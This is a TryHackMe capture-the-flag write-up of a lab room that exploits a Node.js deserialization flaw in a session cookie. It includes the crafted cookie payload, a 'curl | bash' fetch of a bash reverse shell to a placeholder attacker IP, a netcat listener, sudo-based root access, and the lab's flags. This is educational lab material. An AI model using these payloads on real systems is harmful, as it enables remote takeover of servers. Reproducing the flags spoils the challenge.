## Jax sucks alot............. - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/jason)

<i>We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. 
We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially.
We ask that you perform a thorough penetration test and try to compromise the root account. 
There are no rules for this engagement. Good luck!</i>

**IP: 10.10.190.99**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Burp<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan. I also did some fuzzing but it was pointless.

  ```
  nmap -sC -sV -T5 -p- 10.10.190.99

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 72:80:e0:71:f7:a1:a4:75:3c:08:dc:f6:71:d3:47:ee (RSA)
  |   256 43:1a:99:0e:ff:39:4d:b4:9f:7a:1a:ce:33:c8:3b:cc (ECDSA)
  |_  256 8a:10:7b:6a:01:30:c8:49:8f:16:f6:d9:2b:ab:9e:a9 (ED25519)
  80/tcp open  http
  |_http-title: Horror LLC
  | fingerprint-strings: 
  |   GetRequest: 
  |     HTTP/1.1 200 OK
  |     Content-Type: text/html
  |     Date: Mon, 26 May 2025 18:08:59 GMT
  |     Connection: close
  |     <html><head>
  |     <title>Horror LLC</title>
  |     <style>
  |     body {
  |     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
  |     background-size: 300% 300%;
  |     -webkit-animation: Background 10s ease infinite;
  |     -moz-animation: Background 10s ease infinite;
  |     animation: Background 10s ease infinite;
  |     @-webkit-keyframes Background {
  |     background-position: 0% 50%
  |     background-position: 100% 50%
  |     100% {
  |     background-position: 0% 50%
  |     @-moz-keyframes Background {
  |     background-position: 0% 50%
  |     background-position: 100% 50%
  |     100% {
  |     background-position: 0% 50%
  |     @keyframes Background {
  |     background-position: 0% 50%
  |     background-posi
  |   HTTPOptions: 
  |     HTTP/1.1 200 OK
  |     Content-Type: text/html
  |     Date: Mon, 26 May 2025 18:09:00 GMT
  |     Connection: close
  |     <html><head>
  |     <title>Horror LLC</title>
  |     <style>
  |     body {
  |     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
  |     background-size: 300% 300%;
  |     -webkit-animation: Background 10s ease infinite;
  |     -moz-animation: Background 10s ease infinite;
  |     animation: Background 10s ease infinite;
  |     @-webkit-keyframes Background {
  |     background-position: 0% 50%
  |     background-position: 100% 50%
  |     100% {
  |     background-position: 0% 50%
  |     @-moz-keyframes Background {
  |     background-position: 0% 50%
  |     background-position: 100% 50%
  |     100% {
  |     background-position: 0% 50%
  |     @keyframes Background {
  |     background-position: 0% 50%
  |_    background-posi
  ```
  
- Now moving to exploitation.

---

## 🌐 Web Exploitation

- When you intercept the request with Burp, you will see that your input is saved as cookie on the web server.

  ```
  Request:

  POST /?email=bimbo@test.com HTTP/1.1
  Host: 10.10.190.99
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Origin: http://10.10.190.99
  Connection: keep-alive
  Referer: http://10.10.190.99/
  Priority: u=0
  Content-Length: 0
  
  Response:
  
  HTTP/1.1 200 OK
  Set-Cookie: session=eyJlbWFpbCI6ImJpbWJvQHRlc3QuY29tIn0=; Max-Age=900000; HttpOnly, Secure
  Content-Type: text/html
  Date: Mon, 26 May 2025 18:12:39 GMT
  Connection: keep-alive
  Content-Length: 3559
  [SNIP!]
      <script>
      document.getElementById("signup").addEventListener("click", function() {
  	var date = new Date();
      	date.setTime(date.getTime()+(-1*24*60*60*1000));
      	var expires = "; expires="+date.toGMTString();
      	document.cookie = "session=foobar"+expires+"; path=/";
      	const Http = new XMLHttpRequest();
          console.log(location);
          const url=window.location.href+"?email="+document.getElementById("fname").value;
          Http.open("POST", url);
          Http.send();
  	setTimeout(function() {
  		window.location.reload();
  	}, 500);
      }); 
      </script>
  
  echo 'eyJlbWFpbCI6ImJpbWJvQHRlc3QuY29tIn0=' | base64 -d
  {"email":"bimbo@test.com"}
  ```
  
- This points to NodeJS deserialization vulnerability for RCE. Since I did `VulnNet: Node` room recently, I already knew how to exploit this one. You can find my writeup for `VulnNet: Node` [here](https://github.com/mauzware/THM-CTFs/blob/main/VulnNet%3A%20Node.md).

- Here's the syntax for payload. More details about vulnerability can be found [here](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

  ```
  {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
  ```
  
- Before we make a paylod, create a reverse shell. You can use any reverse shell that you like, I used classic bash one-liner. In regards to payload, replace "rce" with "email" and command that we will execute, which will be `curl` followed by `bash`.

  ```
  cat shell.sh                                                       
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  
  {"email":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl http://[YOUR-THM-IP]:80/shell.sh | bash',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
  ```

- Now encode this whole payload to Base64, paste it in Cookie value, change method from POST to GET, start a Python server and start a listener.
  After sending the payload with Burp, you will get a connection on your listener, and you will see that your shell was downloaded from your server with `curl`.

  ```
  BURP REQUEST:

  GET / HTTP/1.1
  Host: 10.10.190.99
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbi9[SNIP]b2coc3Rkb3V0KSB9KTtcbiB9KCkifQ==
  Origin: http://10.10.190.99
  Connection: keep-alive
  Referer: http://10.10.190.99/
  Priority: u=0
  Content-Length: 0

  python3 -m http.server 80                                        
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.190.99 - - [26/May/2025 19:57:56] "GET /shell.sh HTTP/1.1" 200 -
  
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.190.99] 47008
  bash: cannot set terminal process group (662): Inappropriate ioctl for device
  bash: no job control in this shell
  To run a command as administrator (user "root"), use "sudo <command>".
  See "man sudo_root" for details.
  
  ubuntu@ip-10-10-190-99:/opt/webapp$ whoami
  whoami
  ubuntu
  ubuntu@ip-10-10-190-99:/opt/webapp$ id
  id
  uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)  
  ```

---

## 🧍 User Privilege Escalation

- First flag is pretty easy to find.

  ```
  ubuntu@ip-10-10-190-99:/home/dylan$ cat user.txt
  cat user.txt
  0ba48780dee9f5677a4461f588af217c
  ```

---

## 👑 Root Privilege Escalation

- Getting root flag is even easier the user flag.

  ```
  ubuntu@ip-10-10-190-99:/home/dylan$ sudo -l
  sudo -l
  Matching Defaults entries for ubuntu on ip-10-10-190-99:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User ubuntu may run the following commands on ip-10-10-190-99:
      (ALL : ALL) ALL
      (ALL) NOPASSWD: ALL
  
  
  ubuntu@ip-10-10-190-99:/home/dylan$ sudo cat /root/root.txt
  sudo cat /root/root.txt
  2cd5a9fd3a0024bfa98d01d69241760e
  ```
  
- Fun room ngl, bye!

---

## 🏁 Flags

- **User Flag**: `0ba48780dee9f5677a4461f588af217c`
- **Root Flag**: `2cd5a9fd3a0024bfa98d01d69241760e`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Remembering how to exploit NodeJS deserialization vulnerability.`

- What did I learn?
  `Just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
